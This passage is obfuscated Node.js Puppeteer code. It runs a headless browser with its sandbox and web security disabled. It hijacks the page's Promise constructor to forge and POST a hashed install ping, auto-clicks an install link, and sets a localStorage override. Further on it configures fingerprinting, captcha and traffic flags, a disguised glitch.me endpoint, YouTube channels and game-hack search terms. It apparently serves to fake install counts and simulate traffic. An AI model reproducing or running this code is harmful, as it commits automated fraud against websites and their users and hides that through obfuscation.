-0x1 + -0xd28 + 0x1740) << y[0x1aa5 * -0x1 + -0x9 * -0x43c + 0xb74 * -0x1 & N++], P[N >> 0x1911 + 0x1 * 0x724 + -0x2033] |= (0x1 * 0x931 + -0x1c01 * -0x1 + -0x24b2 | L >> 0x4 * -0x7cf + 0x1 * 0x7f1 + 0x1757 & 0x29 * -0x9d + -0x10ca + -0x2 * -0x1517) << y[0x268c + 0x3b * 0xf + 0x1ae * -0x19 & N++], P[N >> -0x1 * -0xe89 + -0x105 + -0xd82] |= (0x25ea + -0x2532 + -0x38 | L >> 0x1fa1 + -0x1814 + 0x2f * -0x29 & 0x2133 + 0x1746 + -0x383a) << y[0x1902 + 0x115b + -0x27 * 0x116 & N++], P[N >> 0x2 * -0x148 + 0x1aae + -0xc0e * 0x2] |= (-0x33 * -0xa2 + -0x1 * 0xfe2 + -0x2 * 0x7f2 | -0x10f * 0xa + 0xc * 0x54 + 0x6e5 & L) << y[0x7 * -0x1b6 + 0x1 * 0x4cf + 0x397 * 0x2 & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= -0x2f * -0x2 + 0x2692 + 0x4 * -0x9ac ? (this['block'] = P[0x22dc + -0x1aa7 + -0x825], this['start'] = N - (-0x2248 + 0x267b * 0x1 + -0x3 * 0x151), this['hash'](), this['hashed'] = -0x6 * 0x51c + -0xfcd + 0x2e76) : this['start'] = N;
                }
                return this['bytes'] > -0x148b548 + -0x18beaf72b + 0x28d33ac72 && (this['hBytes'] += this['bytes'] / (-0x13432b830 + 0x17b702bf0 + 0xb8c28c40) << -0xb45 + 0xbe7 + 0x2 * -0x51, this['bytes'] = this['bytes'] % (0x1254a7ed8 + 0x8c3ea51 * -0x8 + 0x20d4d3b0)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = 0x15d4 + 0x24bf + -0x3a92;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
                J[-0x997 * 0x4 + 0x1 * 0x22cb + -0x1 * -0x3a1] = this['block'], J[K >> -0x20b6 + 0x19ba * -0x1 + 0x3a72] |= x[0xc7c + -0x1c * -0x3d + -0x1 * 0x1325 & K], this['block'] = J[-0x1 * 0x24e6 + -0x1ed2 + 0x43c8], K >= -0x2b * -0x59 + -0x1e25 + 0xf6a && (this['hashed'] || this['hash'](), J[0x16c6 + -0x6be + 0x26 * -0x6c] = this['block'], J[-0xf99 * -0x1 + 0x17 * -0x6d + -0x5be] = J[-0x935 * 0x1 + -0x466 + 0x34 * 0x43] = J[0x1770 + -0x7f * 0x7 + 0x3 * -0x6a7] = J[0x2 * 0x103a + 0x1609 + -0x367a] = J[-0x1 * -0x1f64 + 0xd1 * -0x10 + -0x1250] = J[0x1e89 + 0x247e + -0x4302] = J[-0x1f9a * -0x1 + -0x1a15 + -0x15 * 0x43] = J[-0x16b1 + 0x20e0 + -0x19 * 0x68] = J[-0x95b + -0x5 * -0x2a5 + -0x1eb * 0x2] = J[-0x74 * 0x3f + 0x1030 + 0xa7 * 0x13] = J[0xb * 0x1bb + -0x179a + 0x49b] = J[-0xed1 + -0xc7 * -0x1 + 0x23 * 0x67] = J[-0x215f + 0x576 + -0x1bf5 * -0x1] = J[0x577 * 0x7 + -0x41 * -0x6b + -0x415f] = J[-0xb2 * 0x26 + 0x756 + -0x62 * -0x32] = J[0xe75 + 0x898 + -0x16fe] = 0x1c * 0x152 + 0x53 * 0x71 + 0x6b1 * -0xb), J[-0xd0 + -0x97a * 0x4 + 0x26c6] = this['hBytes'] << 0x1661 * 0x1 + 0x4cd * -0x1 + -0x1191 | this['bytes'] >>> -0x16d5 * 0x1 + -0x1b * 0x72 + -0x45f * -0x8, J[-0x2 * -0xad + 0x2088 + 0x1 * -0x21d3] = this['bytes'] << -0x6 * 0x25 + -0x1ae1 * 0x1 + 0x176 * 0x13, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = -0x20 * -0x24 + 0x17 * -0x1 + -0x459; J < -0xa91 + -0x1211 + 0x1cf2; ++J)
                K = Q[J - (-0xe5 * 0x1a + 0x21eb * -0x1 + -0x2dc * -0x14)] ^ Q[J - (0x5e5 + -0x1f0e + -0x1931 * -0x1)] ^ Q[J - (0x92e + 0xf1 * 0x9 + -0x1199)] ^ Q[J - (0x1 * -0xd5d + -0x26b0 + 0x341d)], Q[J] = K << 0x2ea * 0x3 + -0x24a0 + 0x1be3 * 0x1 | K >>> -0x23d3 + 0x20 * 0x129 + 0x1 * -0x12e;
              for (J = 0x1391 + -0x1845 + 0x4b4; J < -0x40 * -0x9b + -0xe04 + 0x6 * -0x41c; J += 0x1 * 0xe5a + 0x8e * -0x7 + -0xa73 * 0x1)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x38d * -0x5 + -0x3f * -0x12 + -0x3d * -0x38 | L >>> -0x1326 + 0x237 + 0x110a * 0x1) + (M & N | ~M & O) + P + (0x98cb * 0x99d2 + -0x31996b5f * 0x1 + -0x25 * -0x14e320a) + Q[J] << -0x543 + 0xce8 + -0x7a5) << 0x2 * 0xd0a + -0x2208 + 0x7f9 * 0x1 | P >>> -0x815 + -0x51b + -0x1 * -0xd4b) + (L & (M = M << 0x657 + -0xc9b + -0x2b * -0x26 | M >>> 0x95e + 0x218 + 0x4 * -0x2dd) | ~L & N) + O + (0x595ddcc1 + -0x801624a8 + 0x813ac180) + Q[J + (-0x3db + 0x1d66 + -0x198a)] << -0x25 * -0xe3 + 0xe46 + 0x1 * -0x2f15) << -0x12a1 + -0x1415 + 0x26bb | O >>> -0x67 * -0x49 + -0x1 * 0xce5 + 0xb * -0x17d) + (P & (L = L << -0x94a + -0x2 * -0x869 + -0x1a * 0x49 | L >>> 0x25d + -0xfc1 + 0x6b3 * 0x2) | ~P & M) + N + (-0x87023596 + 0x4187fc33 * 0x1 + 0x9ffcb2fc) + Q[J + (-0xb4f + -0x808 + 0x1359)] << -0x26af + 0x98b + -0x1d24 * -0x1) << -0x1 * 0x13c6 + -0x1 * 0xc2e + -0x5 * -0x665 | N >>> 0x3b3 * -0x5 + 0xdc6 + -0xce * -0x6) + (O & (P = P << 0x45b + -0x3f * 0x76 + -0x38b * -0x7 | P >>> 0x12 * 0x222 + -0x19ab * -0x1 + -0x400d) | ~O & L) + M + (0x68 * -0x11f745f + -0x69fdcce2 + -0x3a1 * -0x565433) + Q[J + (-0x55b * 0x6 + -0x18 * 0x21 + 0x233d)] << -0x2 * 0x2fa + -0x11f * 0x8 + -0xbf * -0x14) << -0x11cc + 0x1f8d + -0xdbc | M >>> 0x3d1 + 0x1 * -0x1e8e + -0xd6c * -0x2) + (N & (O = O << -0x225 + -0x7 * -0x1e2 + -0x5 * 0x22f | O >>> -0x1f7e + -0x71 * -0x4d + 0xd * -0x31) | ~N & P) + L + (-0xc9e6fc1 + -0xa9565c82 + 0x1107745dc) + Q[J + (-0x1 * 0x23b + 0x47 * 0x67 + -0x1a52)] << 0x640 + 0x1 * 0x11b7 + -0x17f7, N = N << 0x1e14 + -0x61 * 0x5 + -0x1c11 | N >>> -0x1dd9 + -0x1 * -0xece + 0xf0d;
              for (; J < -0x2548 + 0x1502 + 0x106e; J += -0x13b1 + -0x4 * 0x5f3 + 0x2b82)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x1 * 0x1ad9 + 0x2 * 0x10ca + -0x3c68 | L >>> -0xa92 + -0x9e * 0xb + -0x107 * -0x11) + (M ^ N ^ O) + P + (-0x1 * -0x31e2a9b3 + -0xa7713a66 + 0xe4687c54) + Q[J] << 0x1215 + -0x22a7 + -0x2 * -0x849) << 0x5db * -0x4 + 0xfb9 + 0x7b8 | P >>> 0x1e6 + -0xde7 + 0xc1c) + (L ^ (M = M << -0x1 * 0x3e5 + -0x3 * 0x7d7 + 0x1b88 | M >>> -0xad * -0x11 + -0x39c + -0x7df) ^ N) + O + (0x83cc1f51 + 0x515 * 0x269cd3 + -0xd92d2fff) + Q[J + (-0x1a21 * 0x1 + 0xde1 + -0xc41 * -0x1)] << -0x4b * -0x2d + -0x16b4 * 0x1 + -0x985 * -0x1) << 0x16 + 0x1e4 + -0x1f5 | O >>> 0x265e + 0x2441 + -0x4a84) + (P ^ (L = L << -0x71e * -0x5 + 0x18 * 0xfe + -0x3b48 | L >>> -0x1e4c * -0x1 + 0xa6f + 0x28b9 * -0x1) ^ M) + N + (-0x1 * -0x32bdec5c + 0xd228a5d3 + -0x960ca68e) + Q[J + (-0x77a * 0x1 + -0x585 + -0xd01 * -0x1)] << -0x7 * 0x308 + -0x3 * 0xc97 + -0x3afd * -0x1) << -0x2507 + -0x87 + 0x2593 * 0x1 | N >>> 0x153c + 0x4d2 + -0x1ff * 0xd) + (O ^ (P = P << 0x3 * 0x5e9 + 0x1e38 + -0x2fd5 | P >>> 0x156a + -0x90e + -0xc5a) ^ L) + M + (0x1470a88f * 0x5 + -0x33f84c9a * 0x2 + 0x70973a0a) + Q[J + (0x13af + 0x1cd6 + -0x3082)] << 0x13bc + 0x13e6 + -0x27a2) << 0x7 * 0x169 + 0x1 * 0x5b5 + -0x1 * 0xf8f | M >>> -0x20a5 + -0x1648 + 0x3708) + (N ^ (O = O << 0x51 * -0x63 + 0x1acc + 0x4a5 | O >>> 0x1e3b + 0x1 * 0x2272 + -0x40ab) ^ P) + L + (-0xa927b9 * 0x145 + -0x5c176352 + -0x56c8 * -0x4d02a) + Q[J + (0x1c79 * -0x1 + 0x7 * -0xbf + 0x1 * 0x21b6)] << -0x2 * -0xcee + -0x23d1 + 0x9f5 * 0x1, N = N << 0x1eb4 * 0x1 + 0x5 * 0x1c4 + -0x276a | N >>> -0xca * -0xd + -0x1 * -0x1a7b + 0x24bb * -0x1;
              for (; J < 0x992 + 0x40 * -0x79 + -0x2 * -0xa75; J += 0xd1f + 0x1893 + -0x283 * 0xf)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x23cb + -0x7f1 + -0x591 * 0x5 | L >>> 0x14ff + -0x195d + 0x1 * 0x479) + (M & N | M & O | N & O) + P - (0x6bbb2189 + -0x77472258 + -0x7c7043f3 * -0x1) + Q[J] << 0x3c2 * -0x5 + 0x40b + 0xebf) << 0x1d21 * -0x1 + -0x1c3 + 0x1ee9 | P >>> 0x2190 + 0xa4d * -0x2 + -0xcdb) + (L & (M = M << 0x1 * 0x14b7 + -0xa41 + 0x8 * -0x14b | M >>> 0x18ab * 0x1 + 0x1399 + -0x2c42) | L & N | M & N) + O - (-0x56537b4c + -0xc0721df8 * -0x1 + -0x6c5a078 * -0x1) + Q[J + (-0x22aa + 0x1ff + -0x33 * -0xa4)] << 0x22fc + 0x1 * 0x1031 + -0x21 * 0x18d) << 0x1 * 0x16de + -0x5a3 + -0x1136 | O >>> -0x12d * -0x3 + 0x284 + -0x5f0) + (P & (L = L << -0xf12 + 0x89f + 0x691 | L >>> -0x8a1 + -0x14e * 0xd + -0x1 * -0x1999) | P & M | L & M) + N - (-0xd31dba5 + -0x19576f * 0x233 + 0xb5d167e6) + Q[J + (0x3d9 * -0xa + 0x26ff * -0x1 + 0xf7f * 0x5)] << 0x14 * 0x13e + -0x1e2f + 0x557) << -0xb9e + 0xcd3 * -0x1 + 0x2 * 0xc3b | N >>> -0x70b + 0x4a2 * -0x2 + 0x835 * 0x2) + (O & (P = P << 0x2fb * -0x9 + 0x6ae + 0x15 * 0xf7 | P >>> -0x1d5d * 0x1 + -0x192b * 0x1 + -0x1a * -0x219) | O & L | P & L) + M - (-0x10189ee6 + -0x6f1b0e80 + -0x3b * -0x411c2fe) + Q[J + (-0x413 * -0x6 + -0x74d + -0x1122)] << -0x30e + 0x3e * 0x59 + -0x1 * 0x1280) << -0xefe + -0x1 * -0x92f + 0x5d4 | M >>> 0x6f6 + -0x1317 + -0x1 * -0xc3c) + (N & (O = O << 0x32f * -0x5 + -0x13 * 0x144 + 0x2815 * 0x1 | O >>> -0x1 * 0x416 + 0xdcd * -0x1 + 0x3 * 0x5f7) | N & P | O & P) + L - (0x8324c71 * 0x15 + 0x41864835 + -0x7cc24a56) + Q[J + (-0xb6e + 0x2240 + -0x16ce)] << -0xe22 + -0x232f + 0x3151, N = N << -0xc3e + -0x55d + -0x15d * -0xd | N >>> -0x1 * -0x1875 + 0x2 * -0x971 + -0x1 * 0x591;
              for (; J < -0x7 * 0x46e + -0x871 + -0x46b * -0x9; J += 0x61 * 0x47 + -0x1d80 + 0xa * 0x43)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x41 * -0x3 + 0x1 * 0xab5 + -0xb73 * 0x1 | L >>> 0x1cf0 + -0x1d4a + 0x75) + (M ^ N ^ O) + P - (0x3660574c + -0x69319f70 + 0x686e864e) + Q[J] << -0x21c9 + -0x3ca + 0x2593) << 0x115 * 0xc + -0x1 * 0x1a1a + 0xd23 | P >>> 0x1c73 + -0xc4e + -0x100a) + (L ^ (M = M << -0x1 * 0x1afa + 0x19c * -0xd + 0x1b7 * 0x1c | M >>> 0x1e09 + 0x73c * -0x1 + -0x16cb * 0x1) ^ N) + O - (-0x34c82f6e + -0x48bb33a4 + -0xeed62c5 * -0xc) + Q[J + (0x1471 + 0x1b06 + -0xf * 0x32a)] << -0x17 * 0x139 + 0x3fe + -0x80b * -0x3) << -0x60d * -0x2 + -0x359 * -0x2 + -0x12c7 | O >>> -0x1444 + 0x34 * -0xd + 0x1 * 0x1703) + (P ^ (L = L << -0x17 * -0x88 + 0x2072 + 0x2 * -0x1646 | L >>> -0x1613 + -0xaf4 * 0x2 + 0x1 * 0x2bfd) ^ M) + N - (-0xb * 0x799fced + -0x222766c1 * 0x1 + -0x55b1418d * -0x2) + Q[J + (-0x566 * -0x2 + 0xac8 + 0x2 * -0xac9)] << 0x221 * -0x3 + -0x258a + 0x2bed) << 0x1458 + 0x1f3 * 0x3 + 0xa * -0x29e | N >>> -0x161 * 0x12 + -0x192a + -0x3217 * -0x1) + (O ^ (P = P << -0x14d5 + -0x1f86 + 0x1 * 0x3479 | P >>> -0x69 * -0x33 + -0x26c1 + 0x11d8) ^ L) + M - (0x4d17577d + -0x1c09 * 0x1e76 + -0x23ce705 * 0x9) + Q[J + (-0x1cc5 + -0x1 * -0x6f1 + 0x15d7)] << 0x6 * 0x1a6 + -0x1b37 + 0x1153) << 0x2004 + 0x1 * -0xdc3 + -0x123c | M >>> 0x5 * -0x149 + -0x16be * -0x1 + -0x1036) + (N ^ (O = O << 0x28d * 0xe + 0x2573 + -0x490b | O >>> 0x65 * 0x43 + -0x23a4 + 0x937) ^ P) + L - (-0x4671 * 0x5941 + -0x4b44eb73 * -0x1 + 0x2e77e68) + Q[J + (0x1af * 0x11 + 0x429 + -0x576 * 0x6)] << -0xae8 + -0x5 * -0x2c5 + -0x2f1, N = N << 0x1262 + 0x362 + -0x15a6 | N >>> 0x21c8 + -0xae6 + -0x16e * 0x10;
              this['h0'] = this['h0'] + L << -0x136c + -0x124 * 0x19 + 0x2ff0, this['h1'] = this['h1'] + M << 0x1220 + -0x13 * 0x1ca + 0x2a5 * 0x6, this['h2'] = this['h2'] + N << 0xf7d + 0x2f8 + -0x1275, this['h3'] = this['h3'] + O << -0x236c + -0x1029 + 0x5f * 0x8b, this['h4'] = this['h4'] + P << -0xcbe + -0x135 * 0x15 + 0x2617;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> 0x240 * -0xf + 0x247e + -0x2a2 & 0x407 * -0x4 + -0x20e0 + 0x3 * 0x1059] + w[J >> 0x2602 + -0x1d79 + -0x871 & -0x2614 + 0x362 + 0x22c1] + w[J >> 0x25d + 0x204f + -0x48 * 0x7b & 0x1b86 + 0x19fe + -0x3575] + w[J >> 0x5 * 0x72f + 0x1b6f + -0x3f4a & -0xde2 * 0x1 + 0x181f + -0xa2e] + w[J >> -0xf65 + -0x14 * -0x1ab + -0x8b * 0x21 & 0x65 * 0x40 + 0x1 * 0x211d + -0x3a4e] + w[J >> 0x3 * -0x47b + -0x225 * 0x1 + 0xf9e & -0x1 * -0x973 + 0x69f + -0x1 * 0x1003] + w[J >> 0x1 * 0x863 + -0x2528 + 0x1cc9 * 0x1 & 0x45 + 0x1c8e + 0x20e * -0xe] + w[0x130c * 0x1 + -0x45 * -0x53 + -0x295c & J] + w[K >> -0x49b + -0x1 * -0xb + -0x12b * -0x4 & 0xa * 0x26e + -0x18a6 + -0x23 * -0x3] + w[K >> -0xf * 0x18a + 0x1a * 0x8e + 0x8c2 & 0x1df3 + -0x2597 + -0xdb * -0x9] + w[K >> 0x135 * 0x2 + 0x2322 + 0xda * -0x2c & 0x2 * 0xdcc + -0x1fd * 0x7 + 0x15 * -0xa6] + w[K >> -0x655 * 0x2 + 0x1c42 + 0x7 * -0x238 & -0x1 * -0xc56 + -0x1c9b + 0x1054] + w[K >> 0x387 * -0x8 + -0xb8 + 0x1cfc & -0x291 * -0x3 + 0x108 * -0x4 + 0x6 * -0x96] + w[K >> -0x3c6 + 0xe8f * 0x1 + -0xac1 & 0x1 * -0xb66 + -0x5ab * -0x5 + -0x1 * 0x10e2] + w[K >> -0x6 * 0x661 + -0x1756 + -0x10 * -0x3da & -0x7 * 0x419 + -0x1 * -0x252f + -0x871] + w[0x18f5 * -0x1 + 0x2da + -0x1 * -0x162a & K] + w[L >> 0x11 * 0x234 + 0x5 * 0x377 + 0x137 * -0x2d & 0x19cd + -0x6f2 + -0x12cc] + w[L >> -0x1534 + 0x14d3 * 0x1 + 0x79 & 0x1f75 + -0x5a6 * 0x2 + -0x141a] + w[L >> -0x1b03 + -0x626 * 0x1 + -0x213d * -0x1 & 0x20c0 + -0x172c + -0x985] + w[L >> -0x8 * -0xed + 0xeb5 + -0x160d & -0x49 * 0x71 + 0x1da3 + 0x2a5] + w[L >> -0x7d * -0x2f + 0x16 * 0xc1 + -0x277d & -0x1237 + 0x2463 + -0x121d] + w[L >> -0x1 * -0x1679 + -0x2a * -0x4a + -0x2295 & 0x1527 + 0x250f + -0x3a27] + w[L >> 0x727 * 0x2 + 0x15e + -0xfa8 & 0x14d1 + 0x1141 + -0x2603] + w[0xbbb + 0xb3 * 0xb + -0x1 * 0x135d & L] + w[M >> -0x22f9 * -0x1 + 0x26 * -0x7b + 0x27 * -0x6d & 0x1f55 + -0xc + 0x1 * -0x1f3a] + w[M >> -0x1898 * 0x1 + -0x3 * -0x7e2 + -0x7 * -0x26 & 0x45e + 0x1 * -0x491 + 0x42] + w[M >> -0x10e1 + -0xf4c + 0x2041 & -0x3 * -0x242 + -0x9e8 + -0x331 * -0x1] + w[M >> -0x10c5 + -0x120d * -0x1 + -0x138 & 0x77f * -0x4 + -0x23b * 0x1 + -0x1023 * -0x2] + w[M >> -0x9e5 + -0x577 * 0x1 + -0x1d * -0x88 & 0x14a1 + 0x1bdb + 0x21b * -0x17] + w[M >> 0x14d8 * 0x1 + -0x1732 + 0x262 & -0x18f8 + 0x22cf + -0x9c8] + w[M >> -0x108b + 0x24fb * -0x1 + 0x358a & -0x4 * -0x147 + -0x1e54 + 0x1947] + w[0x21b0 + 0x241 * -0x11 + 0x4b0 & M] + w[N >> -0xe79 * -0x1 + 0x1704 + -0x2561 & 0xfc0 + -0x840 + 0x771 * -0x1] + w[N >> -0x4 * 0x151 + 0x25b * -0x2 + 0xa12 & -0x1 * 0x236c + 0x1f8 + 0x1 * 0x2183] + w[N >> 0x32 * 0x35 + -0x1 * -0x1ad7 + -0x251d & 0x83b + 0xec9 + -0x16f5] + w[N >> -0x23f0 + -0x1373 * -0x1 + -0x13 * -0xdf & -0x3b7 * 0x6 + 0x5ee * -0x2 + -0x4e3 * -0x7] + w[N >> 0xba7 + -0x1475 + -0x16 * -0x67 & 0x156 * -0xf + -0x1297 + -0x1 * -0x26b0] + w[N >> 0xa32 + 0x4 * 0xf1 + 0x6f7 * -0x2 & -0x6d8 + 0x1007 * -0x1 + 0x16ee] + w[N >> 0x17d2 + -0x206a + 0x89c & -0x3 * 0xb5e + 0x1a5a + 0x1 * 0x7cf] + w[0xfcb + 0xc4c + -0x1c08 & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> 0x1 * -0xdc3 + 0x528 + 0x8b3 & 0x1 * 0x407 + 0x1 * -0x31b + 0x13,
                J >> 0xd1c + 0xf77 + -0x1c83 & 0x7d * -0x11 + 0x1 * -0x5e7 + 0xf33,
                J >> 0x1 * -0x109d + 0x13 * -0x95 + 0x1bb4 * 0x1 & -0x2168 + 0x29 * 0xcb + 0x1e4 * 0x1,
                0xd8d + 0x59 * -0x55 + 0x10ff * 0x1 & J,
                K >> 0x1 * 0x949 + -0x11c5 * -0x1 + -0x1af6 * 0x1 & -0x7 * -0x11 + -0xc * 0x19 + 0x1b4,
                K >> -0x7 * -0x4c1 + 0xaf9 * -0x2 + 0x5 * -0x241 & 0xd9 * -0x22 + 0x7cc * 0x1 + -0x3 * -0x757,
                K >> 0xf12 + -0x1cd1 * 0x1 + -0xdc7 * -0x1 & 0x1 * 0x1a32 + 0x14d9 + -0x4 * 0xb83,
                0x745 * 0x5 + 0x15 * -0x193 + 0x1 * -0x24b & K,
                L >> 0x4 * -0x1d + 0x1 * 0x26e + -0x1 * 0x1e2 & -0x397 + -0xab8 + 0x6 * 0x28d,
                L >> -0xe74 + -0x2101 + 0x2f85 & 0xd12 + -0xf77 + -0x364 * -0x1,
                L >> 0x266e * 0x1 + 0x3d * 0x12 + -0x2ab0 & -0x240f + 0xd * -0x135 + 0x34bf,
                -0x5d3 + 0x224a + -0x1b78 & L,
                M >> 0x3ff + 0x131c + -0x1 * 0x1703 & -0x611 * 0x2 + -0x83 * -0x3b + -0x1110,
                M >> 0x26b + -0x2138 + -0x1 * -0x1edd & 0x1a48 + 0x2 * -0x33d + -0x12cf,
                M >> -0x184b + 0x1 * 0x1993 + -0xa0 * 0x2 & 0x1 * -0x215d + -0xa32 + -0x6 * -0x76d,
                0x17b3 + -0x12d + 0x72d * -0x3 & M,
                N >> 0xd95 + -0x188d + -0x3b0 * -0x3 & -0x4 + 0x1a01 + -0x18fe,
                N >> -0x1fd9 + 0x1bfa + 0x3ef & -0x1 * 0x244e + 0x1ed7 + 0x676 * 0x1,
                N >> 0x1 * -0x1b3b + -0xe74 + -0xb5 * -0x3b & -0x1a * 0x140 + -0x18ac + 0x3a2b,
                -0x1d * -0x2 + 0x3 * -0x38f + -0x24a * -0x5 & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(0xf * -0x170 + 0x43 * 0x4c + 0x1c0), (K = new DataView(J))['setUint32'](-0x212 * 0x1 + 0x1615 + -0x1403, this['h0']), K['setUint32'](-0xe5f * 0x1 + -0x21c9 + 0x302c, this['h1']), K['setUint32'](-0x395 + 0x135 * 0x9 + -0x740, this['h2']), K['setUint32'](-0x1 * -0x679 + 0x4a9 * -0x4 + 0xc37, this['h3']), K['setUint32'](0x16af + 0x26e5 + -0x2 * 0x1ec2, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[-0x5e0 + -0x249a + 0x2a7a];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = 0x163c * -0x1 + 0x1abd + -0x481;
            J[0x144f * 0x1 + -0x8 * 0xdf + -0x1 * 0xd57]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[-0x2d3 + -0x1ec7 * 0x1 + -0x2 * -0x10cd] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), -0x28f * -0x4 + -0x1c42 + 0x1207), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = 0x2178 + -0x25e4 + 0x46d;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, 0x980 + 0x2607 + -0x29ab), Promise['resolve'](0x1ac * -0xb + 0x1357 + -0xf2);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = 0xaf5 + -0x4 * -0x479 + -0x1cd9; j < -0x10c1 + 0xb03 * 0x3 + -0x1047 * 0x1; j++)
    i();
}
const NETWORK_PATIENCE = 0x20ac + 0x21d * -0x1 + 0xb1 + (-0x19 * 0x73 + 0x9b * -0x35 + -0x1 * -0x370a) * Math['random'](),
  MM_NETWORK_PATIENCE = (-0x2f * 0x2f + 0xb44 + 0x8 * -0x54) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = -0x649 + 0x3 * 0x35 + 0x1 * 0x5aa; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];
searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + T(0xb) + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 